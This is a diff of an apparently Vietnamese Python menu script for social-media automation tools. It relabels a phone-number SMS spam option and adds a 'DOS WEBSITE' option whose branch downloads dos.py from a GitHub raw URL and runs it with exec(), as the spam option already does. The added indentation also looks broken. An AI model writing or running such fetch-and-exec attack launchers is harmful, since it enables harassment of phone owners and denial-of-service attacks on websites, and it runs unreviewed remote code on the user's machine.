@@ -303,7 +303,7 @@ console = Console()
 def clear():
     os.system("clear" if os.name != "nt" else "cls")
 def show_menu():
-    table = Table(title="   TOOL GOLIKE", box=box.SQUARE_DOUBLE_HEAD, style="white")
+    table = Table(title="   TOOL BUASH ANG DZAI", box=box.SQUARE_DOUBLE_HEAD, style="white")
     table.add_column("STT", style="cyan", justify="center")
     table.add_column("Tên Tool", style="magenta", justify="left")
     table.add_column("Mô tả", style="red")
@@ -314,7 +314,8 @@ def show_menu():
     table.add_row("3", "TTC FACEBOOK", "Cookie","Hoạt Động")    
     table.add_row("4", "TDS FACEBOOK", "Cookie","Hoạt Động")
     table.add_row("5", "TDS TIKTOK", "Auto click","Hoạt Động")
-    table.add_row("6", "SPAM ", "Nhây SĐT","Hoạt Động")
+    table.add_row("6", "SPAM ", "Nhây Số Điện Thoại","Hoạt Động")
+    table.add_row("7", "DOS WEBSITE ", "Đánh Sập Wed","Hoạt Động")
     console.print(table)
 def main():
     while True:
@@ -368,6 +369,15 @@ def main():
             try:
               kiem_tra_mang()
               code = requests.get('https://raw.githubusercontent.com/BuashAng77/ToolBuashAng/main/SMS.py').text
+              exec(code, globals())
+            except:
+              sys.exit()
+        except:
+              sys.exit()
+         elif choice == "7":
+            try:
+              kiem_tra_mang()
+              code = requests.get('https://raw.githubusercontent.com/BuashAng77/ToolBuashAng/main/dos.py').text
               exec(code, globals())
             except:
               sys.exit()
